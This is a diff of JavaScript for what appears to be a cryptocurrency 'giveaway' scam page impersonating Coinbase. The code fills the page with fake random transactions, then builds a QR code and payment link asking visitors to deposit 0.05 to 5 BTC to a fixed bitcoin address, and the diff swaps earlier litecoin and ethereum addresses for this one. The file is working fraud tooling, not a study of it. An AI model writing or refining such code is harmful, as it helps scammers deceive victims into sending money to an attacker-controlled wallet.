@@ -167,41 +167,44 @@ function update_trans() {
     "LAToken 1"
   ]
 ) {
-  return list[Math.floor(Math.random() * list.length)];
+  return list[Math.floor(Math.random() * list.length)]
 }),
   $(document).ready(() => {
-    for (i = 25; i > 0; i--) create_transaction(i);
-    update_tx(), update_count();
+    for (i = 25; i > 0; i--) create_transaction(i)
+    update_tx(), update_count()
   }),
-  (times = document.getElementsByClassName("timer")),
+  (times = document.getElementsByClassName('timer')),
   (window.onload = () => {
     update_trans(),
       (trans = setInterval(() => {
-        update_trans();
-      }, 1e4));
+        update_trans()
+      }, 1e4))
   }),
-   $("#gen-btn").click(() => {
-    if ($("#cal-in").val() >= 0.5 && $("#cal-in").val() <= 500) {
-      amount_entered = $("#cal-in").val();
-      $("#gen-amount").text(amount_entered);
-      $("#copy_").attr("data-clipboard-text", amount_entered);
-      $("#warn").text(""), $(".pop-body").css("display", "flex");
-      // $("#qrcode_svg").attr('src', 'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%3Altc1qf2sg5s30nhjw75g9jg9tx49q4caldty03wfgzr%3Famount%3D'+amount_entered+'%26message%3DDeposit%2Bto%2B2xcrypto%2Bgiveaway%2Bevent&amp;size=100x100');
-      $("#paynow").parent().attr('href', 'ethereum:ltc1qf2sg5s30nhjw75g9jg9tx49q4caldty03wfgzr?amount='+amount_entered);
-    } else $("#warn").text("Amount should be within 1 ETH to 500 ETH");
-  }),
-  $('#paynow')
+  $('#gen-btn').click(() => {
+    if ($('#cal-in').val() >= 0.05 && $('#cal-in').val() <= 5) {
+      amount_entered = $('#cal-in').val()
+      tm = Date.now()
+      $('#gen-amount').text(amount_entered)
+      $('#qrcode_svg').attr(
+        'src',
+        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3Abc1qlgmvzupj79rf6ltptnldsm8mt64gatzayjkm8s%3Famount%3D' +
+          amount_entered +
+          '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
+          tm +
+          '&size=150x150',
+      )
+      $('#paynow')
         .parent()
         .attr(
           'href',
-          'litecoin:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
+          'bitcoin:bc1qlgmvzupj79rf6ltptnldsm8mt64gatzayjkm8s?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
         )
       $('#copy_').attr('data-clipboard-text', amount_entered)
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
-    } else $('#warn').text('Amount should be within 5 BTC to 500 LTC')
+    } else $('#warn').text('Amount should be within 0.05 BTC to 5 BTC')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
